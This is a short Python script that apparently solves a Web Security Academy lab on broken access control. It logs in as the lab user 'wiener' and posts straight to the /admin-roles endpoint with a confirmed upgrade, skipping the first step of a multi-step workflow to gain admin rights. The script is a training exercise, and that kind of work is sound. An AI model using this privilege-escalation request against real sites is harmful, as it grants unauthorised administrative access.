###################################################################
#
# Lab: Multi-step process with no access control on one step
#
# Hack Steps: 
#      1. Login as wiener
#      2. Upgrade wiener to be an admin bypassing the first step
#
###################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a53004203dc7ab385e88beb00640046.web-security-academy.net"

def main():
    print(Fore.WHITE + "⦗1⦘ Logging in as wiener.. ", end="", flush=True)
    
    data = { "username": "wiener", "password": "peter" }
    login_as_wiener = post_data("/login", data)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Upgrading wiener to be an admin bypassing the first step.. ", end="", flush=True)        
    
    session = login_as_wiener.cookies.get("session")
    cookies = {"session": session}
    data = { "username": "wiener", "action": "upgrade", "confirmed": "true" }
    post_data("/admin-roles", data, cookies=cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def post_data(path, data, cookies = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)
   
        
if __name__ == "__main__":
    main()

